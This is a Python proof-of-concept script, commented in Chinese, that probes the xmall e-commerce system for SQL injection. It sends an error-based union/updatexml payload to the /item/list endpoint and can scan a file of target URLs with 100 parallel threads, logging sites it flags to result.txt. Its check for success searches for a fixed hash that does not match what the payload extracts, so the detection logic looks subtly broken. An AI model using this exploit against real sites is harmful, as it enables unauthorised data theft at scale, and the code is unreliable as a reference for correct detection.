import argparse
import sys
import requests
from multiprocessing.dummy import Pool

# 主函数，解析命令行参数并执行相应操作
def main():
    # 创建参数解析器
    parser = argparse.ArgumentParser(description='xmall是一个基于SOA架构的分布式电商购物商城,前后端分离,该系统/item/list、/item/listSearch、/sys/log、/order/list、/member/list、/member/list/remove等多处接口存在SQL注入漏洞，会造成数据泄露。')
    # 添加命令行参数
    parser.add_argument('-u', '--url', dest='url', type=str, help='intput link')
    parser.add_argument('-f', '--file', dest='file', type=str, help='file path')

    # 解析命令行参数
    args = parser.parse_args()
    # 如果指定了URL而没有指定文件，则直接进行漏洞检测
    if args.url and not args.file:
        poc(args.url)
    # 如果指定了文件而没有指定URL，则从文件中读取URL列表进行漏洞检测
    elif not args.url and args.file:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n', ''))
        # 使用多线程池并发处理URL列表中的URL
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python {sys.argv[0]} -h")

# 发送payload进行漏洞检测
def poc(target):
    # 构造payload的URL
    payload_url = "/item/list?draw=1&order%5B0%5D%5Bcolumn%5D=1&order%5B0%5D%5Bdir%5D=desc)a+union+select+updatexml(1,concat(0x7e,user(),0x7e),1)%23;&start=0&length=1&search%5Bvalue%5D=&search%5Bregex%5D=false&cid=-1&_=1679041197136"
    url = target + payload_url
    headers = {
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36"
    }

    try:
        # 发送GET请求检测漏洞
        res = requests.get(url, headers=headers, verify=False, timeout=5)
        res1 = requests.get(target)
        if res1.status_code == 200:
            # 如果响应中包含特定字符串，则说明存在漏洞
            if 'c4ca4238a0b923820dcc509a6f75849b' in res.text:
                print(f'[+] 该url {target} 存在漏洞')
                # 将存在漏洞的URL写入到结果文件中
                with open('result.txt', 'a', encoding='utf-8') as f:
                    f.write(target + '\n')
            else:
                print(f'[-] 该站点 {target} 不存在漏洞')
        else:
            print('[0]连接失败，请手动访问测试')
    except Exception as e:
        # 发生异常时打印错误信息
        print(f'[*] 访问 {target} 时发生异常: {str(e)}')

# 程序入口
if __name__ == '__main__':
    main()
